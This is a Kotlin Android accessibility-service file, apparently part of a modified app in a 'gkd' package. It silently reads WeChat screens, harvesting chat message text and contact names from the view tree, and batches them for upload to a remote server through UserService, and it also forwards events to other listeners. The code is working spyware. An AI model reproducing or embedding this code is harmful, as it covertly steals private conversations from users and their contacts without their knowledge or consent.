package li.songe.gkd.service

import android.util.Log
import android.view.View
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.example.myapplication.network.UserService

object Listener {
    private val TAG = "Listener"
    private var lastRead = System.currentTimeMillis()
    private var user = ""
    private val messageList = ArrayList<String>()
    private val allMessageList = ArrayList<String>()
    private val sleepDefault = 5 * 1000
    private val friendSleep = 1000 * 10 * 10
    private var sleep = sleepDefault
    private var uploading = false

    fun onAccessibilityEvent(
        event: AccessibilityEvent?,
        rootInActiveWindow: AccessibilityNodeInfo?
    ) {
        AppUseListener.onAccessibilityEvent(event, rootInActiveWindow)
        QListener.onAccessibilityEvent(event, rootInActiveWindow)

        if (event?.packageName.toString() != "com.tencent.mm") return
        if ((System.currentTimeMillis() - lastRead) < sleep) return
        if (messageList.size > 100 && !uploading) {
            allMessageList.addAll(messageList)
            uploadMessage()
            if (allMessageList.size > 100 * 1000) allMessageList.clear()
        }
        rootInActiveWindow?.let {
            lastRead = System.currentTimeMillis()
            sleep = sleepDefault
            Log.d(TAG, "wechat start")
            findAll(it, 0)
        }
    }

    private fun uploadMessage() {
        uploading = true
        var liveMessage = ""
        messageList.map { liveMessage = "$liveMessage\n$it" }
        messageList.clear()
        uploading = false
        UserService.login {
            UserService.uploadMessage(it, liveMessage)
        }
    }

    private fun findAll(node: AccessibilityNodeInfo, level: Int) {
        if (level > 25) return
        for (i in 0 until node.childCount) {
            val node1 = node.getChild(i) ?: return
            var className: String? = null
            try {
                className = node1.className.toString() + ""
            } catch (e: java.lang.Exception) {
                e.printStackTrace()
            }
            if (className == "android.widget.TextView") {
                val message = node1.text?.toString() ?: ""
                if (message == "浮窗") return
                if (message == "朋友圈") {
                    sleep = friendSleep
                    return
                }

                addMessage(message)
                Log.d(TAG, message)
            } else if (className == "android.widget.ImageView") {
                val cuser = node1.contentDescription?.toString() ?: ""
                if (user != cuser) {
                    messageList.add(cuser)
                    Log.d(TAG, cuser)
                    user = cuser
                }
            } else if (node1.childCount > 0) {
                findAll(node1, level + 1)
            }
        }
    }

    private fun addMessage(message: String) {
        if (messageList.contains(message) || allMessageList.contains(message)) {
            return
        }
        messageList.add(message)
    }

}